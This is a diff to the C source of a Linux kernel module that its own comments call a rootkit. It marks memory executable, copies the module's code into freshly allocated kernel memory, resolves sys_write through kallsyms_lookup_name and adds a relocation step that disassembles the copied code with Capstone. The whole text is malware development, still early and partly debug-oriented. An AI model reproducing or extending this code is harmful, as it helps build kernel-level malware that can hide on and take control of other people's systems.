@@ -46,18 +46,23 @@
 /*
  * Declarations
  */
-extern void pinfo(const char *fmt, ...);
+extern int pinfo(const char *fmt, ...);
+extern int perr(const char *fmt, ...);
 //void *readfile(const char *file, size_t *len);
 int relocate(void *code, size_t code_len);
 extern void * (*f_kmalloc)(size_t size, gfp_t flags);
 extern struct pid * (*f_find_vpid)(pid_t nr);
-extern char kernel_start, kernel_end;
+extern int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
+extern int (*f_sys_write)(int fd, const char *mem, size_t len);
+extern struct tty_struct * (*f_get_current_tty)(void);
+extern char kernel_start, kernel_code_end, kernel_end;
+extern long syscall(long num, ...);
 
 int init_module(void)
 {
 	size_t kernel_len, kernel_paglen, kernel_pages;
 	void *kernel_addr = NULL;
-	
+
 	kernel_len = &kernel_end - &kernel_start;
 	kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
 	kernel_pages = kernel_paglen >> PAGE_SHIFT;
@@ -65,7 +70,7 @@ int init_module(void)
 	//printk("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_addr = %p, kernel_pagdown_addr = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
 
 	/*
-	 * Make our kernel executable, to can use pinfo().
+	 * Make our kernel executable, to can use pinfo(), perr().
 	 */
 	set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);
 
@@ -74,28 +79,32 @@ int init_module(void)
 	 */
 	f_kmalloc = kmalloc;
 	f_find_vpid = find_vpid;
+	f_vscnprintf = vscnprintf;
+	f_sys_write = kallsyms_lookup_name("sys_write");
 
 	/*
      * Insert out rootkit into memory.
 	 */
-	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
+	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
 	kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
 	if (kernel_addr != NULL) {
-		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
+		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
 		/*
 		 * Make our rootkit code executable.
 		 */
 		set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
-		pinfo("kernel_addr's pages are now executable.");
+		pinfo("kernel_addr's pages are now executable.\n");
 
 		memcpy(kernel_addr, &kernel_start, kernel_len);
-		pinfo("kernel is now copied to kernel_addr.");
+		pinfo("kernel is now copied to kernel_addr.\n");
 		
+		relocate(kernel_addr, ((unsigned long)&kernel_code_end - (unsigned long)&kernel_start));
+
 		kfree(kernel_addr);
 
 		return 0;
 	} else {
-		pinfo("can not allocate memory");
+		perr("can not allocate memory.\n");
 	}
 
     return -1;
@@ -111,23 +120,21 @@ int relocate(void *code, size_t code_len) {
 	size_t count;
 	
 	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
-		pinfo("cs_open() error");
+		perr("cs_open() error\n");
 		return -1;
 	}
 
-	pinfo("%d\n", code_len);
-	size_t func_off = ((unsigned long)&init_module - (unsigned long)&kernel_start);
-	pinfo("func_off = %d", func_off);
-	count = cs_disasm(handle, code + func_off, code_len - func_off, (unsigned long)&kernel_start + func_off, 0, &insn);
-	pinfo("%d\n", count);
+	count = cs_disasm(handle, code, code_len, (unsigned long)&kernel_start, 0, &insn);
+	pinfo("%d instructions disassembled.\n", count);
 	if (count > 0) {
 		size_t j;
 		for (j = 0; j < count; j++) {
-			pinfo("0x%"PRIx64":\t%s\t\t%s", insn[j].address, insn[j].mnemonic, insn[j].op_str);
+			pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
 			size_t i;
 			for (i = 0; i< insn[j].size; i++) {
-				pinfo("%02x", insn[j].bytes[i]);
+				pinfo("%02x ", insn[j].bytes[i]);
 			}
+			pinfo("\n");
 		}
 		cs_free(insn, count);
 	} else {
